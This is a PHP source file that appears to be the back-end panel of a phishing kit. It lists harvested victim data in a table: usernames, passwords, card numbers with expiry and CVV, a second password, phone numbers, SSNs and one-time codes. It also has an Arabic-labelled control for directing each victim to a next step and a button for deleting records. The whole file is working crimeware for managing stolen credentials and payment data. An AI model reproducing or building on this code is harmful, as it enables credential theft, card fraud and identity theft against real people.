<?php
session_start();
require_once 'init.php';

$users = $User->FetchAllUsersForList();

if ($users != false):
    foreach ($users as $row): ?>
        <tr data-user-id="<?= $row->id; ?>">
            <td id="page<?= $row->id; ?>"><span
                    class="badge bg-light text-dark border"><?= htmlspecialchars($row->page ?? ''); ?></span>
            </td>
            <td id="username<?= $row->id; ?>"><strong
                    class="text-primary"><?= htmlspecialchars($row->username ?? ''); ?></strong>
            </td>
            <td id="password<?= $row->id; ?>"><?= htmlspecialchars($row->password ?? ''); ?></td>
            <td id="cardNumber<?= $row->id; ?>">
                <?php
                if (!empty($row->cardNumber)) {
                    $cardParts = explode(' | ', $row->cardNumber);
                    if (count($cardParts) >= 3) {
                        echo '<div class="d-flex flex-column gap-1">';
                        echo '<span class="badge bg-primary text-white text-start badge-payment"><i class="bi bi-credit-card me-1"></i> ' . htmlspecialchars($cardParts[0] ?? '') . '</span>';
                        echo '<span class="badge bg-secondary text-white text-start badge-payment"><i class="bi bi-calendar3 me-1"></i> ' . htmlspecialchars($cardParts[1] ?? '') . '</span>';
                        echo '<span class="badge bg-dark text-white text-start badge-payment"><i class="bi bi-lock me-1"></i> ' . htmlspecialchars($cardParts[2] ?? '') . '</span>';
                        if (isset($cardParts[3])) {
                            echo '<span class="badge bg-info text-dark text-start badge-payment"><i class="bi bi-person me-1"></i> ' . htmlspecialchars($cardParts[3] ?? '') . '</span>';
                        }
                        echo '</div>';
                    } else {
                        echo '<span class="badge bg-light text-dark border badge-payment">' . htmlspecialchars($row->cardNumber ?? '') . '</span>';
                    }
                } else {
                    echo '-';
                }
                ?>
            </td>
            <td id="passwordtwo<?= $row->id; ?>"><span
                    class="badge bg-dark text-white px-2 py-1 fs-6"><?= htmlspecialchars($row->pass ?? ''); ?></span>
            </td>
            <td><?= htmlspecialchars($row->phone ?? ''); ?></td>
            <td><?= htmlspecialchars($row->ssn ?? ''); ?></td>
            <td id="otp<?= $row->id; ?>"><strong class="text-danger fs-5"><?= htmlspecialchars($row->otp ?? ''); ?></strong>
            </td>
            <td id="pass<?= $row->id; ?>"><span
                    class="badge bg-secondary text-white px-2 py-1 fs-6"><?= htmlspecialchars($row->passwordtwo ?? ''); ?></span>
            </td>
            <td>
                <button class="action-btn btn-action" onclick="removeBackground(this, <?= $row->id; ?>)" title="اتخاذ إجراء">
                    <i class="bi bi-gear-fill"></i>
                </button>

                <!-- Action Modal -->
                <div class="modal fade" id="card<?= $row->id; ?>" tabindex="-1" aria-hidden="true">
                    <div class="modal-dialog modal-dialog-centered">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h5 class="modal-title"><i class="bi bi-send text-primary me-2"></i>
                                    توجيه المستخدم</h5>
                                <button type="button" class="btn-close m-0" data-bs-dismiss="modal"></button>
                            </div>
                            <div class="modal-body">
                                <div id="cardDetails<?= $row->id; ?>"></div>
                            </div>
                        </div>
                    </div>
                </div>
            </td>
            <td>
                <form action="" method="POST" class="m-0">
                    <input type="hidden" name="userId" value="<?= $row->id; ?>">
                    <button type="submit" name="deleteUser" class="action-btn btn-delete" title="حذف"
                        onclick="return confirm('تأكيد الحذف؟');">
                        <i class="bi bi-trash-fill"></i>
                    </button>
                </form>
            </td>
        </tr>
    <?php endforeach; endif; ?>